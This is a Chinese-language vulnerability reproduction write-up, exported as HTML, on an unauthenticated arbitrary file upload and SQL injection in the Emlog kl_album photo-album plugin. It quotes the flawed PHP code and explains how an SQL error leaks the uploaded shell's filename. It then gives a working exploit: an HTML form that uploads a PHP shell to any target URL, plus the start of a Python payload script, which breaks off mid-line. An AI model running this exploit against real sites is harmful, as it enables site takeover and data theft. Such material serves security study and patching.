<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="emlog-相册插件前台sql注入getshell"><span class="csDE05BCC">Emlog </span><span class="csECDA2D3">相册插件前台</span><span class="csDE05BCC">SQL</span><span class="csECDA2D3">注入</span><span class="csDE05BCC">+Getshell</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">首先安装</span><span class="cs8926E06">Emlog</span><span class="cs9C1B1871">的相册的插件</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Emlog/Emlog%20%e7%9b%b8%e5%86%8c%e6%8f%92%e4%bb%b6%e5%89%8d%e5%8f%b0SQL%e6%b3%a8%e5%85%a5+Getshell_files/image0.png" width="560" height="323" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">安装之后可以在目录：</span><span class="cs8926E06">emlog\src\content\plugins\kl_album</span><span class="cs9C1B1871">下找到所有的安装文件：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Emlog/Emlog%20%e7%9b%b8%e5%86%8c%e6%8f%92%e4%bb%b6%e5%89%8d%e5%8f%b0SQL%e6%b3%a8%e5%85%a5+Getshell_files/image1.png" width="560" height="242" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">之后我们分析</span><span class="cs8926E06">Kl-album_ajax_do.php</span><span class="cs9C1B1871">文件</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/**</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> * kl_album_ajax_do.php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> * design by KLLER</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> */</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">require_once(&#39;../../../init.php&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$DB = MySql::getInstance();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$kl_album_config = unserialize(Option::get(&#39;kl_album_config&#39;));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if(isset($_POST[&#39;album&#39;]) &amp;&amp; isset($_FILES[&#39;Filedata&#39;])){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(function_exists(&#39;ini_get&#39;)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$kl_album_memory_limit = ini_get(&#39;memory_limit&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$kl_album_memory_limit = substr($kl_album_memory_limit, 0, strlen($kl_album_memory_limit)-1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$kl_album_memory_limit = ($kl_album_memory_limit+20).&#39;M&#39;;</span></p><p class="cs3A447A38"><span class="cs9FB05234">&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ini_set(&#39;memory_limit&#39;, $kl_album_memory_limit);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;define(&#39;KL_UPLOADFILE_MAXSIZE&#39;, kl_album_get_upload_max_filesize());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;define(&#39;KL_UPLOADFILE_PATH&#39;, &#39;../../../content/plugins/kl_album/upload/&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;define(&#39;KL_IMG_ATT_MAX_W&#39;, &nbsp;&nbsp;&nbsp;100);//</span><span class="cs7FFD2630">图片附件缩略图最大宽</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;define(&#39;KL_IMG_ATT_MAX_H&#39;, &nbsp;&nbsp;&nbsp;100);//</span><span class="cs7FFD2630">图片附件缩略图最大高</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$att_type = array(&#39;jpg&#39;, &#39;jpeg&#39;, &#39;png&#39;, &#39;gif&#39;);//</span><span class="cs7FFD2630">允许上传的文件类型</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$album = isset($_POST[&#39;album&#39;]) ? intval($_POST[&#39;album&#39;]) : &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if($_FILES[&#39;Filedata&#39;][&#39;error&#39;] != 4){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$upfname = kl_album_upload_file($_FILES[&#39;Filedata&#39;][&#39;name&#39;], $_FILES[&#39;Filedata&#39;][&#39;error&#39;], $_FILES[&#39;Filedata&#39;][&#39;tmp_name&#39;], $_FILES[&#39;Filedata&#39;][&#39;size&#39;], $_FILES[&#39;Filedata&#39;][&#39;type&#39;], $att_type);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$photo_size = chImageSize(EMLOG_ROOT.substr($upfname, 2), KL_IMG_ATT_MAX_W, KL_IMG_ATT_MAX_H);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$result = $DB-&gt;query(&quot;INSERT INTO &quot;.DB_PREFIX.&quot;kl_album(truename, filename, description, album, addtime, w, h) VALUES(&#39;{$_FILES[&#39;Filedata&#39;][&#39;name&#39;]}&#39;, &#39;{$upfname}&#39;, &#39;&quot;.date(&#39;Y-m-d&#39;, time()).&quot;&#39;, {$album}, &quot;.time().&quot;, {$photo_size[&#39;w&#39;]}, {$photo_size[&#39;h&#39;]})&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($result){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$new_id = $DB-&gt;insert_id();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$the_option_value = Option::get(&#39;kl_album_&#39;.$album);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($the_option_value !== null){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$the_option_value = trim($new_id.&#39;,&#39;.$the_option_value, &#39;,&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Option::updateOption(&#39;kl_album_&#39;.$album, $the_option_value);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$CACHE-&gt;updateCache(&#39;options&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exit;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if(ROLE != &#39;admin&#39;) exit(&#39;access deined!&#39;);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">根据上面的代码，我们可以看到验证身份的代码在上传文件的后面，所以任意用户可以实现文件上传，那么之后我们再看看上传部分看看到底是如何进行验证或者对文件进行过滤的，这里面定义了一个</span><span class="cs8926E06">$att_type = array(&#39;jpg&#39;, &#39;jpeg&#39;, &#39;png&#39;, &#39;gif&#39;);</span><span class="cs9C1B1871">，并且将</span><span class="cs8926E06">$att_type </span><span class="cs9C1B1871">这个变量和</span><span class="cs8926E06">$_FILE</span><span class="cs9C1B1871">一起传入了</span><span class="cs8926E06">kl_album_upload_file</span><span class="cs9C1B1871">函数</span></p><p class="cs3A447A38"><span class="cs9FB05234">unction kl_album_upload_file($filename, $errorNum, $tmpfile, $filesize, $filetype, $type, $isIcon = 0){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$kl_album_config = unserialize(Option::get(&#39;kl_album_config&#39;));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$extension &nbsp;= strtolower(substr(strrchr($filename, &quot;.&quot;),1));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$uppath = KL_UPLOADFILE_PATH . date(&quot;Ym&quot;) . &quot;/&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$fname = md5($filename) . date(&quot;YmdHis&quot;) . rand() .&#39;.&#39;. $extension;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$attachpath = $uppath . $fname;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(!is_dir(KL_UPLOADFILE_PATH)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;umask(0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ret = @mkdir(KL_UPLOADFILE_PATH, 0777);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($ret === false) return &#39;</span><span class="cs7FFD2630">创建文件上传目录失败</span><span class="cs9FB05234">&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(!is_dir($uppath)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;umask(0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ret = @mkdir($uppath, 0777);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($ret === false) return &quot;</span><span class="cs7FFD2630">上传失败。文件上传目录</span><span class="cs9FB05234">(content/plugins/kl_album/upload)</span><span class="cs7FFD2630">不可写</span><span class="cs9FB05234">&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;doAction(&#39;kl_album_upload&#39;, $tmpfile);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">缩略</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$imtype = array(&#39;jpg&#39;,&#39;png&#39;,&#39;jpeg&#39;,&#39;gif&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$thum = $uppath.&quot;thum-&quot;. $fname;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$attach = in_array($extension, $imtype) &amp;&amp; function_exists(&quot;ImageCreate&quot;) &amp;&amp; kl_album_resize_image($tmpfile,$filetype,$thum,$isIcon,KL_IMG_ATT_MAX_W,KL_IMG_ATT_MAX_H) ? $thum : $attachpath;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$kl_album_compression_length = isset($kl_album_config[&#39;compression_length&#39;]) ? intval($kl_album_config[&#39;compression_length&#39;]) : 1024;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$kl_album_compression_width = isset($kl_album_config[&#39;compression_width&#39;]) ? intval($kl_album_config[&#39;compression_width&#39;]) : 768;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if($kl_album_compression_length == 0 || $kl_album_compression_width == 0){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(@is_uploaded_file($tmpfile)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(@!move_uploaded_file($tmpfile ,$attachpath)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@unlink($tmpfile);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return &quot;</span><span class="cs7FFD2630">上传失败。文件上传目录</span><span class="cs9FB05234">(content/plugins/kl_album/upload)</span><span class="cs7FFD2630">不可写</span><span class="cs9FB05234">&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo &#39;kl_album_successed&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chmod($attachpath, 0777);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(in_array($extension, $imtype) &amp;&amp; function_exists(&quot;ImageCreate&quot;) &amp;&amp; kl_album_resize_image($tmpfile,$filetype,$attachpath,$isIcon,$kl_album_compression_length,$kl_album_compression_width)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo &#39;kl_album_successed&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(@is_uploaded_file($tmpfile)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(@!move_uploaded_file($tmpfile ,$attachpath)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@unlink($tmpfile);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return &quot;</span><span class="cs7FFD2630">上传失败。文件上传目录</span><span class="cs9FB05234">(content/plugins/kl_album/upload)</span><span class="cs7FFD2630">不可写</span><span class="cs9FB05234">&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo &#39;kl_album_successed&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chmod($attachpath, 0777);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$attach = substr($attach, 6, strlen($attach));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return &nbsp;&nbsp;&nbsp;&nbsp;$attach;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">从上面的代码中我们发现，对于之前传入的</span><span class="cs8926E06">$_type</span><span class="cs9C1B1871">这个变量在这个函数里根本就没有起到任何左右，函数中定义的</span><span class="cs8926E06">$imtype = array(&#39;jpg&#39;,&#39;png&#39;,&#39;jpeg&#39;,&#39;gif&#39;);</span><span class="cs9C1B1871">，也不是用来验证后缀的，而是判断是否需要生成缩略图的，所以重点就是下面的内容了：</span></p><p class="cs3A447A38"><span class="cs9FB05234">$extension &nbsp;= strtolower(substr(strrchr($filename, &quot;.&quot;),1));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$uppath = KL_UPLOADFILE_PATH . date(&quot;Ym&quot;) . &quot;/&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$fname = md5($filename) . date(&quot;YmdHis&quot;) . rand() .&#39;.&#39;. $extension;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$attachpath = $uppath . $fname;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if(@!move_uploaded_file($tmpfile ,$attachpath)){</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里我们可以发现上传的文件名是：</span></p><p class="cs3A447A38"><span class="cs9FB05234">$fname = md5($filename) . date(&quot;YmdHis&quot;) . rand() .&#39;.&#39;. $extension;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里的意思是将原来的文件名的</span><span class="cs8926E06">md5</span><span class="cs9C1B1871">值</span><span class="cs8926E06">+</span><span class="cs9C1B1871">当前时间</span><span class="cs8926E06">+rand</span><span class="cs9C1B1871">随机数</span><span class="cs8926E06">+</span><span class="cs9C1B1871">后缀，</span><span class="cs8926E06">md5</span><span class="cs9C1B1871">值和时间基本上比较好确定，但是这个</span><span class="cs8926E06">rand</span><span class="cs9C1B1871">（）随机数一般都是</span><span class="cs8926E06">0-65535</span><span class="cs9C1B1871">之间，非常麻烦。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">同时我们可以看到下面的代码，并没有把问卷名输出的地方，只是</span><span class="cs8926E06">echo &#39;kl_album_successed&#39;;</span><span class="cs9C1B1871">。难道，我们需要暴力破解</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">名字？</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我们返回</span><span class="cs8926E06">kl_album_ajax_do.php</span><span class="cs9C1B1871">，可以发现上传的</span><span class="cs8926E06">if</span><span class="cs9C1B1871">语句中有如下代码：</span></p><p class="cs3A447A38"><span class="cs9FB05234">$result = $DB-&gt;query(&quot;INSERT INTO &quot;.DB_PREFIX.&quot;kl_album(truename, filename, description, album, addtime, w, h) VALUES(&#39;{$_FILES[&#39;Filedata&#39;][&#39;name&#39;]}&#39;, &#39;{$upfname}&#39;, &#39;&quot;.date(&#39;Y-m-d&#39;, time()).&quot;&#39;, {$album}, &quot;.time().&quot;, {$photo_size[&#39;w&#39;]}, {$photo_size[&#39;h&#39;]})&quot;);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里将</span><span class="cs8926E06">$_FILES[&#39;Filedata&#39;][&#39;name&#39;]</span><span class="cs9C1B1871">直接插入数据库。这里另造成了一个</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">注入漏洞，当然既然有之前的</span><span class="cs8926E06">getshell</span><span class="cs9C1B1871">，这里的注入就有点当陪衬了。不过</span><span class="cs8926E06">emlog</span><span class="cs9C1B1871">在遇到</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">语句出错的情况下是会报错的。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">所以所以，这里我们正好用到这个特性，通过报错可以将</span><span class="cs8926E06">$upfname</span><span class="cs9C1B1871">这个字段爆出来，这也就是我们上传成功的</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">名字。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">如何报错？上传文件名里加个单引号即可。</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">&lt;form id=&quot;exp&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;p&gt;target url &gt; &lt;input id=&quot;url&quot; type=&quot;text&quot; style=&quot;width: 300px&quot;&gt;&lt;/p&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;p&gt;shell file &gt; &lt;input type=&quot;file&quot; name=&quot;Filedata&quot;&gt;&lt;/p&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;input name=&quot;album&quot; type=&quot;hidden&quot; value=&quot;111111&quot; &gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;GO!&quot; &omicron;nclick=&quot;exp.action=url.value+&#39;/content/plugins/kl_album/kl_album_ajax_do.php&#39;;&quot;&gt;&lt;/p&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/form&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">保存为</span><span class="cs8926E06">html</span><span class="cs9C1B1871">，本地打开：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Emlog/Emlog%20%e7%9b%b8%e5%86%8c%e6%8f%92%e4%bb%b6%e5%89%8d%e5%8f%b0SQL%e6%b3%a8%e5%85%a5+Getshell_files/image2.png" width="560" height="98" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">填入目标</span><span class="cs8926E06">url</span><span class="cs9C1B1871">，并选择要上传的</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">。（如图，我这里是</span><span class="cs8926E06">info&#39;.php</span><span class="cs9C1B1871">，会令</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">出错）。点击</span><span class="cs8926E06">GO!</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">之后可以发现出错了，可以发现文件名已经爆出来了：</span><span class="cs8926E06">../content/plugins/kl_album/upload/201411/38493d4468377f721357e9c64f93637d2014111211381611097.php<br/></span><span class="cs9C1B1871">访问可见</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Emlog/Emlog%20%e7%9b%b8%e5%86%8c%e6%8f%92%e4%bb%b6%e5%89%8d%e5%8f%b0SQL%e6%b3%a8%e5%85%a5+Getshell_files/image3.png" width="560" height="307" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里给出独自等待的一份</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">#!/usr/bin/env python</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># -*- coding: gbk -*-</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># -*- coding: utf-8 -*-</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Date: 2015/4/30</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Created by </span><span class="cs7FFD2630">独自等待</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">博客</span><span class="cs9FB05234"> http://www.waitalone.cn/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import sys, os, re, time</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">try:</span><span 